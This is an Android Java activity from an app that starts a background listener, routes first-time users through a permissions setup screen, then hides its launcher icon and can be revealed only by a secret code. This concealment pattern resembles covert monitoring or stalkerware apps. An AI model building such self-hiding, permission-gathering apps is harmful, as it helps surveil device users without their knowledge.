package com.busho.app.activities;

import android.content.Intent;
import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;

import com.busho.app.helpers.AppVisibilityHelper;

/**
 * Legacy entry — videos/games/chat removed.
 * First run → setup+hide. If already shown via secret code, do nothing.
 */
public class DashboardActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        AppVisibilityHelper visibility = AppVisibilityHelper.getInstance(this);
        visibility.ensureListenerStarted();

        if (!SetupPermissionsActivity.isSetupDone(this)) {
            startActivity(new Intent(this, SetupPermissionsActivity.class)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK));
            finish();
            return;
        }

        if (visibility.isAppHidden()) {
            visibility.enforceHiddenLauncher();
            moveTaskToBack(true);
        }
        finish();
    }
}
